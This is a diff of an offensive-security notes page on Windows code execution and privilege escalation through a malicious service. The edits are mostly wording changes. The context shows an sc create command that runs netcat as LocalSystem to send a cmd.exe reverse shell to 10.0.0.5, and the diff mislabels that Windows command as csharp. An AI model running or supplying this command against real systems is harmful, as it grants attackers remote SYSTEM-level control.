@@ -6,11 +6,11 @@ description: 'Code Execution, Privilege Escalation'
 
 ## Execution
 
-Creating an evil service with an nc reverse shell:
+Creating an evil service with a netcat reverse shell:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
-```bash
+```csharp
 C:\> sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
 [SC] CreateService SUCCESS
 C:\> sc start evilsvc
@@ -20,7 +20,7 @@ C:\> sc start evilsvc
 
 ## Observations
 
-The reverse shell lives under services.exe:
+The reverse shell lives under services.exe as expected:
 
 ![](../.gitbook/assets/services-nc.png)
 
